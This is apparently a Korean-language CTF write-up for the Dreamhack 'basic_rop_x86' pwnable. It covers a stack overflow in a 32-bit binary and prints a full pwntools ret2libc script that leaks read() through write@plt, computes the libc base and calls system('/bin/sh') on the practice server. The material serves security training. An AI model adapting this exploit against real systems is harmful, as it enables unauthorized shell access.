# 🚩 [basic_rop_x86]

> **Category:** Pwnable  
> **Difficulty:** <span style="color: #CD7F32; font-weight: bold;">B2</span>  
> **Flag:** `DH{--}`  

---

## 📄 1. Challenge Description
* **Environment :**
  ```text
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
* **Reference :**
  ```text
    Return Oriented Programming
---

## 🔍 2. Vulnerability Analysis

이 문제는 **NX**가 적용되어 있어 단순 BOF로 `RET`를 덮어쓰면 NX로 인해 프로그램이 터집니다.
따라서 **1) read() 주소 Leak** 후 **2) libc base 계산과 system() 호출**를 수행해야 합니다.

### Code Review & Vulnerable Points
C 언어 의사 코드(Decompiled Code) 및 핵심 메뉴 기능 분석:

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```
## 🗡️ 3. Exploit Scenario (공격 시나리오)

1. **`read()` 주소 leak:**
   * `Payload = Dummy + write_plt + cleanup_gadget + 1 + read_got + 4 + main` 형태로 `read()`주소를 출력받는다.

2. **`system(/bin/sh)` 실행:**
   * `Payload = Dummy + system + exit + /bin/sh` 형태로 페이로드를 구성하여 실행시킨다.

3. **Shell 획득 및 Flag 획득**

---

## 💥 4. Exploit Script (`ex.py`)

```python
from pwn import *

#p = process("./basic_rop_x86")
p=remote("host3.dreamhack.games",21331)
#print(f"PID : {p.pid}")

def slog(name, addr): return success(': '.join([name, hex(addr)]))

#e = ELF("./basic_rop_x86")
#r = ROP("./basic_rop_x86")


dummy = b'a' * 0x48

e = context.binary = ELF("./basic_rop_x86", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
rop = ROP(e)

write_plt = e.plt["write"]
read_got = e.got["read"]
main = e.symbols["main"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
exit_offset = libc.symbols["exit"]
binsh_offset = next(libc.search(b"/bin/sh"))

cleanup_gadget = rop.find_gadget(
    ["pop esi","pop edi","pop ebp","ret"]
).address

payload = dummy
payload += p32(write_plt)
payload += p32(cleanup_gadget)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)
payload += p32(main)

p.send(payload)
p.recvuntil(b"a" * 0x40)
read_addr = u32(p.recvn(4))
#p.recvn(0x40 - 0x4)

libc_base = read_addr - read_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset
ex = libc_base + exit_offset

success(f"read: {read_addr:#x}")
success(f"libc base: {libc_base:#x}")
success(f"system: {system:#x}")
success(f"/bin/sh: {binsh:#x}")


payload = dummy
payload += p32(system)
payload += p32(ex)
payload += p32(binsh)

p.send(payload)
p.recvuntil(b"a" * 0x40)

p.interactive()
```
---




## 💡 5. Code Analysis & Deep Dive (주요 포인트 분석)

* **`libc_base`주소 구하기 :**
  * `read_addr`주소에서 `read_offset`을 뺀 값이 `libc_base`이 된다.
* **`system()`주소 구하기 :**
  * `libc_base`에 `system_offset`을 더한 값이 `system`의 주소가 된다.

---

## 🎓 6. Retrospective / Takeaways (요약 및 느낀 점)

* 32bit 환경에서 `rop`사용 법을 배웠다.
* `libc_base`주소를 구하는 법과 그 주소를 활용해 다른 함수의 주소를 구하는 법을 배웠다.
